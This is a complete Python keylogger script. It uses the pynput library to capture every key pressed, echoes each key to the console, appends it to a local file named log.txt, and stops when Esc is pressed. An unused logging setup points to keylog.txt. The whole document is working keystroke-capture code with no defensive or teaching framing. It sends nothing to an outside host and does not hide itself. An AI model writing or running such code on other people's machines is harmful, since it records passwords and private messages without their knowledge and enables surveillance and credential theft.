from pynput import keyboard
import logging

# Set up logging
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

key_list = []

def key_pressed(key):
    try:
        key_list.append(key)
        log_keys(key_list)
    except:
        pass

def key_released(key):
    if key == keyboard.Key.esc:
        global listening
        listening = False
        return False

def log_keys(list_of_keys):
    with open('log.txt', 'a') as log:
        for k in list_of_keys:
            result = str(k).replace("'", '')
            print(result)
            log.write(result + ' ')
        list_of_keys.clear()

listening = True
with keyboard.Listener(on_press=key_pressed, on_release=key_released) as listener:
    while listening:
        listener.join()


